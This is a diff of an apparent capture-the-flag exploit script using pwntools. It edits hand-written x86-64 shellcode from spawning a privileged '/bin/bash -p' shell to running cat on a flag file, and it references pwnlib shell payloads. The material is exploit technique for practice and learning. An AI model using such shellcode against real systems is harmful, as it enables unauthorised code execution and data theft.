@@ -17,12 +17,12 @@ r = p.recvuntil(b"Reading 0x1000 bytes from stdin.")
 print(r.decode())
 
 shellcode="""
-push 0x68  # b'h'
-push 0x6e69622f 
-mov dword ptr [rsp+4], 0x7361622f  # b'/bin/bas'
+push 0x7273752f
+push 0x6e69622f
+mov dword ptr [rsp+4], 0x7461632f  # b'/bin/cat'
 push rsp
 pop rdi
-push 0x702d  # b'-p'
+push 0x616c662f
 push rsp
 pop rsi
 push 0
@@ -38,13 +38,14 @@ syscall
 """
 # both not working, how to prevent 48 opcode in 64 bit mode? 
 #shellcode=pwnlib.shellcraft.i386.linux.cat("/flag")
-#shellcode=pwnlib.shellcraft.i386.linux.sh()
+#shellcode=pwnlib.shellcraft.amd64.linux.sh()
 shellcode=(asm(shellcode))
 
 
-print('1', shellcode)
+print('1', disasm(shellcode))
+ELF.from_bytes(shellcode).debug()
 
 
 shellcode=bytes(shellcode)
 p.send(shellcode)
-p.interactive()
+print(p.recvall().decode("UTF-8"))
